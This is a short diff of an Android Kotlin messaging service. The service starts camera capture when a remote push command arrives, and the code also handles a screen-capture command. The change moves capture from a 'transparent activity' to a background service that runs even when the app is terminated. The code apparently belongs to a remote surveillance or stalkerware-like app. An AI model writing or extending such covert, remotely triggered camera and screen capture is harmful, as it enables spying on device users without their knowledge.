@@ -63,11 +63,20 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
                 val useFront = data["front_camera"]?.toBoolean() ?: true
                 
                 try {
-                    // ✅ Use transparent activity instead of background service
-                    CameraTransparentActivity.start(applicationContext, useFront)
-                    Log.d(TAG, "✅ Camera activity started")
+                    // ✅ Check camera permission first
+                    if (checkSelfPermission(android.Manifest.permission.CAMERA) 
+                        != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                        Log.e(TAG, "❌ No camera permission - cannot capture")
+                        return
+                    }
+                    
+                    // ✅ Use foreground service instead of activity when app is terminated
+                    CameraBackgroundService.startCapture(applicationContext, useFront)
+                    Log.d(TAG, "✅ Camera service started")
+                    
                 } catch (e: Exception) {
-                    Log.e(TAG, "❌ Failed to start camera activity", e)
+                    Log.e(TAG, "❌ Failed to start camera service", e)
+                    e.printStackTrace()
                 }
             }
             "SCREEN_CAPTURE" -> {
